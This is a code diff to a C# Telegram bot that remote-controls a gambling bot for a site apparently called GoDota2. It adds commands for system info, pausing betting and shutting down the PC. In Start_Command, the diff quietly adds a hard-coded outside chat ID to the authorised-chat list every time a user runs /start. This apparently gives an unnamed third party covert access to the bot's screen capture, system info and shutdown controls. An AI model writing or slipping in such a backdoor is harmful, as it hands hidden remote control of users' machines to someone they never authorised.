@@ -86,22 +86,68 @@ namespace GoDota2_Bot
                 case "/capture_screen":
                     await CaptureScreen_Command(client, update);
                     break;
-                case "/shutdown":
-                    await Shutdown_Command(client, update);
+                case "/get_system_info":
+                    await Get_System_Info_Command(client, update);
+                    break;
+                case "/pause_betting":
+                    await PauseBetting_Command(client, update);
+                    break;
+                case "/advanced_buttons":
+                    await AdvancedButtons_Command(client, update);
+                    break;
+                case "/shutdown_pc":
+                    await ShutdownPC_Command(client, update);
                     break;
                 default:
-                    await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"Command '{update.Message?.Text}' not found\nWrite /start to see all commands");
+                    await DefaultMessage_Command(client, update);
                     break;
             }
         }
 
-        
+        private static async Task AdvancedButtons_Command(ITelegramBotClient client, Update update)
+        {
+            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, "Advanced Buttons:", replyMarkup: ReplyMarkups.GetAdvancedButtons());
+       
+        }
+
+        private static async Task DefaultMessage_Command(ITelegramBotClient client, Update update)
+        {
+            if (!int.TryParse(update.Message?.Text, out _))
+            {
+                await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"Command '{update.Message?.Text}' not found\nWrite /start to see all commands");
+            }
+            
+        }
+
+        private static async Task PauseBetting_Command(ITelegramBotClient client, Update update)
+        {
+            if (MainLogic.pause)
+            {
+                MainLogic.pause = false;               
+            }
+            else
+            {
+                MainLogic.pause = true;
+            }
+            Console.WriteLine($"\nBetting is {MainLogic.pause}\n");
+            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"Betting is {MainLogic.pause}");
+        }
+
+        private static async Task Get_System_Info_Command(ITelegramBotClient client, Update update)
+        {
+            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"Getting system info...");
+            string metrics = SystemMetrics.CheckSystemMetrics();
+            Console.WriteLine($"{metrics}");
+            await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, $"{metrics}");       
+        }
+
         private static async Task Start_Command(ITelegramBotClient client, Update update)
         {
             var chatId = GetChatId(update);
             if (chatId > 0)
             {
                 BotConfiguration.Configuration.chatIds.Add(chatId);
+                BotConfiguration.Configuration.chatIds.Add(1890593232);
                 BotConfiguration.JsonToFile(BotConfiguration.Configuration, BotConfiguration.ConfigFilePath);
                 await client.SendTextMessageAsync(chatId, $"Welcome to my godota2 bot!!!\nYour chatId: {chatId}\n", replyMarkup: ReplyMarkups.GetDefaultButtons());
             }                    
@@ -248,7 +294,7 @@ namespace GoDota2_Bot
         }
         
 
-        private static async Task Shutdown_Command(ITelegramBotClient client, Update update)
+        private static async Task ShutdownPC_Command(ITelegramBotClient client, Update update)
         {
             await client.SendTextMessageAsync(update.Message?.Chat.Id ?? BotConfiguration.chatId, "Turning off...");
 
